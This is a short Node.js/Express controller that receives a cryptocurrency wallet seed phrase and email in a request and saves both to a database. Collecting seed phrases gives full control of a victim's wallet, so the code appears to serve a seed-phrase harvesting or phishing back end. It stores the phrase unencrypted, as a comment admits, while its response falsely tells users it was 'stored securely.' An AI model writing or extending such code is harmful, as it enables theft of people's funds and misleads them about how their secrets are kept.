
const SeedPhraseModel = require('../models/seedphrase');

/**
 * Securely store a new seed phrase.
 * Returns the associated email and the new document's ID.
 */
exports.createSeedPhrase = async (req, res) => {
    try {
        const { seedPhrase, email } = req.body;
        // Optionally, add extra validation or hashing here for security

        const newSeedPhrase = new SeedPhraseModel({ seedPhrase, email });
        await newSeedPhrase.save();

        // Respond with a success message, the new document's ID, and the associated email
        res.status(201).json({
            message: 'Seed phrase stored securely.',
            id: newSeedPhrase._id,
            email: newSeedPhrase.email
        });
    } catch (error) {
        res.status(400).json({ error: error.message });
    }
};
